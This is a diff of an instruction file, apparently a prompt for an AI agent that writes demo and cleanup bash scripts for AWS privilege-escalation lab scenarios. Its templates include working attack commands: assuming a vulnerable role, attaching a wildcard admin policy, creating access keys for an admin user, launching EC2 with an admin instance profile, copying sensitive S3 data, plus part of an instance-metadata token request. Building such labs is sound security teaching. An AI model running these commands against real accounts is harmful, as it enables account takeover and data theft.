@@ -189,9 +189,9 @@ TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-m
 The orchestrator will provide you with a complete `scenario.yaml` file that conforms to the schema defined in `/SCHEMA.md` at the project root. This YAML file contains all the information you need:
 
 **From scenario.yaml you will use:**
-- **category**: "Privilege Escalation", "Regular Finding", "Toxic Combination", or "Tool Testing"
-- **sub_category**: "self-escalation", "principal-access", "new-passrole", "existing-passrole", "credential-access", "privilege-chaining", "cross-account-escalation", etc.
-- **path_type**: "self-escalation", "one-hop", "multi-hop", or "cross-account"
+- **category**: "Privilege Escalation", "CSPM: Misconfig", "CSPM: Toxic Combination", or "Tool Testing"
+- **sub_category**: For privesc (self-escalation/one-hop only): "self-escalation", "principal-access", "new-passrole", "existing-passrole", "credential-access". Not used for multi-hop, cross-account, or CSPM categories.
+- **path_type**: "self-escalation", "one-hop", "multi-hop", "cross-account", "single-condition", or "toxic-combination"
 - **target**: "to-admin" or "to-bucket"
 - **environments**: Array of environments involved
 - **attack_path.principals**: Ordered list of all principals in the attack
@@ -206,6 +206,27 @@ Additionally, the orchestrator will provide:
 - **Cleanup requirements**: What artifacts are created during the demo
 - **Infrastructure type**: Does it create EC2, Lambda, or other regional resources?
 
+## Command Display Conventions
+
+All demo scripts display AWS CLI commands inline before executing them, and track attack commands for a summary at the end. This uses two helper functions:
+
+### Command Classification Rules
+
+| Command type | Function | Example |
+|---|---|---|
+| **Attack** (`show_attack_cmd`) | The actual privilege escalation actions — the technique named in the scenario directory | `aws sts assume-role`, `aws iam create-access-key`, `aws iam put-role-policy`, `aws lambda create-function`, `aws lambda invoke`, `aws s3 cp` (for bucket exfiltration) |
+| **Non-attack AWS** (`show_cmd`) | Identity checks, verification, proving access | `aws sts get-caller-identity`, `aws iam list-users`, `aws s3 ls` (initial access check) |
+| **Setup** (no display) | Script plumbing, not AWS CLI | `terraform output`, credential exports, `cd`, `zip`, `sleep` |
+
+**Key principle**: Attack commands are the ones that perform the privilege escalation technique or demonstrate the final impact (data exfiltration). Non-attack commands verify identity or prove access.
+
+### Display Format
+- `show_cmd` renders in **dim** text (`\033[2m`) — visible but not attention-grabbing
+- `show_attack_cmd` renders in **cyan** text (`\033[0;36m`) with a leading newline — visually distinct, and recorded in an array for the end-of-script summary
+- Multi-line AWS commands (using `\` continuations) are shown as a **single-line equivalent** in the display string
+- Shell redirections (`> /dev/null`, `2>&1`, `| grep`) are **excluded** from display strings
+- Variables are left as-is in display strings — bash expands them at runtime
+
 ## demo_attack.sh Template
 
 ### Standard Structure
@@ -216,7 +237,8 @@ Additionally, the orchestrator will provide:
 # Demo script for {scenario-name} privilege escalation
 # This scenario demonstrates how {brief description}
 
-set -e
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -224,6 +246,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-{environment}-{scenario-shorthand}-starting-user"
@@ -281,6 +321,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -292,6 +333,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -307,6 +349,16 @@ echo "1. Started as: $STARTING_USER"
 echo "2. {Summary of steps}"
 echo "3. Achieved: {Final access level}"
 
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER → ({technique}) → {target} → {access level}"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- {List artifacts created}"
 
@@ -314,6 +366,9 @@ echo -e "\n${RED}⚠ Warning: {Any warnings}${NC}"
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
 ```
 
 ### Common Script Patterns
@@ -324,6 +379,7 @@ echo -e "${YELLOW}Step 4: Assuming the vulnerable role${NC}"
 ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/{role-name}"
 echo "Role ARN: $ROLE_ARN"
 
+show_attack_cmd "aws sts assume-role --role-arn $ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ROLE_ARN \
     --role-session-name demo-session \
@@ -337,6 +393,7 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed role${NC}\n"
@@ -349,6 +406,7 @@ For **to-admin** scenarios:
 ```bash
 echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -362,6 +420,7 @@ For **to-bucket** scenarios:
 echo -e "${YELLOW}Step 5: Verifying we don't have bucket access yet${NC}"
 TARGET_BUCKET="pl-sensitive-data-$ACCOUNT_ID-{suffix}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
+show_cmd "aws s3 ls s3://$TARGET_BUCKET"
 if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -376,6 +435,7 @@ echo -e "${YELLOW}Step 6: Adding admin policy to our role${NC}"
 ROLE_NAME="{role-name}"
 echo "Modifying role: $ROLE_NAME"
 
+show_attack_cmd "aws iam put-role-policy --role-name $ROLE_NAME --policy-name EscalatedAdminPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
 aws iam put-role-policy \
     --role-name $ROLE_NAME \
     --policy-name "EscalatedAdminPolicy" \
@@ -402,6 +462,7 @@ echo -e "${YELLOW}Step 6: Creating access keys for admin user${NC}"
 ADMIN_USER="{admin-user-name}"
 echo "Creating keys for: $ADMIN_USER"
 
+show_attack_cmd "aws iam create-access-key --user-name $ADMIN_USER --output json"
 KEY_OUTPUT=$(aws iam create-access-key --user-name $ADMIN_USER --output json)
 NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
 NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')
@@ -422,6 +483,10 @@ export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
 # Keep region consistent
 export AWS_REGION=$AWS_REGION
 
+# Verify new identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "New identity: $ADMIN_IDENTITY"
 echo -e "${GREEN}✓ Now using admin credentials${NC}\n"
 ```
 
@@ -432,6 +497,7 @@ ADMIN_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/{admin-role-name}"
 INSTANCE_PROFILE="{instance-profile-name}"
 
 # Get AMI with explicit region flag
+show_cmd "aws ec2 describe-images --region $AWS_REGION --owners amazon --filters 'Name=name,Values=al2023-ami-2023.*-x86_64' 'Name=state,Values=available' --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
 AMI_ID=$(aws ec2 describe-images \
     --region $AWS_REGION \
     --owners amazon \
@@ -453,6 +519,7 @@ DEFAULT_SUBNET=$(aws ec2 describe-subnets \
     --output text)
 
 # Launch instance with explicit region flag
+show_attack_cmd "aws ec2 run-instances --region $AWS_REGION --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name=$INSTANCE_PROFILE --subnet-id $DEFAULT_SUBNET --query 'Instances[0].InstanceId' --output text"
 INSTANCE_ID=$(aws ec2 run-instances \
     --region $AWS_REGION \
     --image-id $AMI_ID \
@@ -471,6 +538,7 @@ echo -e "${GREEN}✓ EC2 instance launched${NC}\n"
 echo -e "${YELLOW}Step 8: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -488,12 +556,14 @@ TARGET_BUCKET="pl-sensitive-data-$ACCOUNT_ID-{suffix}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
 
 echo "Listing bucket contents..."
-if aws s3 ls s3://$TARGET_BUCKET; then
-    echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
-fi
+show_attack_cmd "aws s3 ls s3://$TARGET_BUCKET/"
+aws s3 ls s3://$TARGET_BUCKET/
+echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
 
 echo "Reading sensitive data..."
-if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - ; then
+DOWNLOAD_FILE="/tmp/sensitive-data-${ACCOUNT_ID}.txt"
+show_attack_cmd "aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt $DOWNLOAD_FILE"
+if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt $DOWNLOAD_FILE; then
     echo -e "${GREEN}✓ Successfully read sensitive data!${NC}"
     echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
 else
@@ -822,24 +892,29 @@ echo ""
 Before completing, verify:
 
 1. ✅ Script has proper shebang (`#!/bin/bash`)
-2. ✅ Set `set -e` to exit on errors
+2. ✅ `export AWS_PAGER=""` set near the top (no `set -e`)
 3. ✅ All variables are defined before use
-4. ✅ Color codes are consistent (RED, GREEN, YELLOW, BLUE, NC)
-5. ✅ Resource names match Terraform outputs
-6. ✅ **Credentials retrieved from grouped Terraform outputs using jq**
-7. ✅ **Region retrieved from Terraform output**
-8. ✅ **Region re-exported at every credential switch**
-9. ✅ **All EC2 commands have explicit --region flags**
-10. ✅ **All Lambda commands have explicit --region flags**
-11. ✅ **All IAM policy propagation waits are 15 seconds (not 5)**
-12. ✅ **Cleanup script gets admin credentials from Terraform (not AWS profiles)**
-13. ✅ **Cleanup script retrieves region from Terraform**
-14. ✅ **Cleanup script uses region in all EC2 commands**
-15. ✅ **Cleanup script does not use AWS_PROFILE_FLAG variable**
-16. ✅ Error handling for missing resources in cleanup
-17. ✅ Clear step numbering and descriptions
-18. ✅ Final summary is accurate
-19. ✅ Scripts will be made executable (chmod +x)
+4. ✅ Color codes are consistent (RED, GREEN, YELLOW, BLUE, NC, DIM, CYAN)
+5. ✅ **Helper block present**: `ATTACK_COMMANDS=()`, `show_cmd()`, `show_attack_cmd()` functions defined after color codes
+6. ✅ **`show_cmd` before every non-attack AWS CLI command** (identity checks, verification, list-users)
+7. ✅ **`show_attack_cmd` before every attack AWS CLI command** (the actual privilege escalation technique)
+8. ✅ **Attack Commands summary section** in the final summary block (iterates over `ATTACK_COMMANDS` array)
+9. ✅ **`touch "$(dirname "$0")/.demo_active"`** at the very end of the script
+10. ✅ Resource names match Terraform outputs
+11. ✅ **Credentials retrieved from grouped Terraform outputs using jq**
+12. ✅ **Region retrieved from Terraform output**
+13. ✅ **Region re-exported at every credential switch**
+14. ✅ **All EC2 commands have explicit --region flags**
+15. ✅ **All Lambda commands have explicit --region flags**
+16. ✅ **All IAM policy propagation waits are 15 seconds (not 5)**
+17. ✅ **Cleanup script gets admin credentials from Terraform (not AWS profiles)**
+18. ✅ **Cleanup script retrieves region from Terraform**
+19. ✅ **Cleanup script uses region in all EC2 commands**
+20. ✅ **Cleanup script does not use AWS_PROFILE_FLAG variable**
+21. ✅ Error handling for missing resources in cleanup
+22. ✅ Clear step numbering and descriptions
+23. ✅ Final summary is accurate
+24. ✅ Scripts will be made executable (chmod +x)
 
 ## File Permissions
 
@@ -858,6 +933,8 @@ After creating the scripts, report back to the orchestrator:
 - Description of what the cleanup script removes
 - Confirmation that scripts are executable
 - Confirmation that region handling is implemented correctly
+- Confirmation that `show_cmd`/`show_attack_cmd` are used for all AWS CLI commands
+- Confirmation that Attack Commands summary section is included
 
 ## Testing Considerations
 
